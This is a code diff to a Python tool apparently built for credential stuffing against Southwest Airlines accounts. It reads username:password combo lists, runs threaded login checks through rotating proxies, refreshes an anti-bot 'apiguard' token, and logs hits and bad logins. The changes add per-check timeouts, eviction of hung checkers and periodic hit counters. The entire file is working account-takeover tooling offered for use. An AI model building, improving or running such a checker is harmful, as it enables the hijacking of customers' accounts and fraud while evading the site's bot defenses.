@@ -11,6 +11,8 @@ from southwest_checker.checker import parse_combo
 from southwest_checker.web_adapter import (
     _UNSET,
     check_account,
+    evict_checker,
+    get_job_settings,
     parse_proxy_lines,
     prewarm_apiguard,
     refresh_apiguard,
@@ -19,6 +21,10 @@ from southwest_checker.web_adapter import (
 
 from .combo_store import iter_nonempty_lines
 from .db import FINAL_STATUSES, combo_key, get_checked_keys, insert_hit, mark_combo_checked
+
+# node kernel bootstrap (45s) + login retries + HTTP
+DEFAULT_CHECK_TIMEOUT = 90
+PROGRESS_LOG_EVERY = 25
 
 
 @dataclass
@@ -249,6 +255,7 @@ class CheckerWorker:
 
         with self._lock:
             self.stats.checked += 1
+            checked = self.stats.checked
 
         if status in FINAL_STATUSES:
             mark_combo_checked(username, password, status)
@@ -265,12 +272,20 @@ class CheckerWorker:
             with self._lock:
                 self.stats.bads += 1
                 count = self.stats.bads
-            if count <= 5 or count % 100 == 0:
+            if count <= 5 or count % 25 == 0:
                 self._log(result.format_line())
         else:
             with self._lock:
                 self.stats.errors += 1
             self._log(result.format_line())
+
+        if checked % PROGRESS_LOG_EVERY == 0:
+            with self._lock:
+                self._log(
+                    f"Progress — {self.stats.checked:,} checked · "
+                    f"{self.stats.hits} hits · {self.stats.bads} bad · "
+                    f"{self.stats.errors} err"
+                )
 
     def _run(
         self,
@@ -278,7 +293,10 @@ class CheckerWorker:
         proxies: list[str],
         threads: int,
     ) -> None:
-        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
+        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, TimeoutError as FuturesTimeoutError, wait
+
+        settings = get_job_settings()
+        check_timeout = DEFAULT_CHECK_TIMEOUT if settings.full_bootstrap else 60
 
         pending = list(combos)
         retry_queue: list[tuple[str, str]] = []
@@ -301,7 +319,9 @@ class CheckerWorker:
                     self.stats.current = username
 
                 proxy = self._pick_proxy(proxies, idx) if proxies else _UNSET
-                return check_account(username, password, proxy=proxy, timeout=60)
+                return check_account(
+                    username, password, proxy=proxy, timeout=check_timeout
+                )
 
             def submit_next(pool) -> bool:
                 with self._lock:
@@ -312,7 +332,7 @@ class CheckerWorker:
                 except StopIteration:
                     return False
                 future = pool.submit(task, idx, username, password)
-                inflight[future] = (username, password)
+                inflight[future] = (username, password, idx)
                 return True
 
             try:
@@ -324,9 +344,21 @@ class CheckerWorker:
                     while inflight:
                         done, _ = wait(inflight, return_when=FIRST_COMPLETED)
                         for future in done:
-                            username, password = inflight.pop(future)
+                            username, password, idx = inflight.pop(future)
+                            proxy = (
+                                self._pick_proxy(proxies, idx) if proxies else None
+                            )
                             try:
-                                result = future.result()
+                                result = future.result(timeout=check_timeout + 15)
+                            except FuturesTimeoutError:
+                                evict_checker(proxy)
+                                with self._lock:
+                                    self.stats.checked += 1
+                                    self.stats.errors += 1
+                                self._log(
+                                    f"ERROR | {username} | "
+                                    f"worker timed out after {check_timeout + 15}s"
+                                )
                             except Exception as exc:
                                 with self._lock:
                                     self.stats.checked += 1
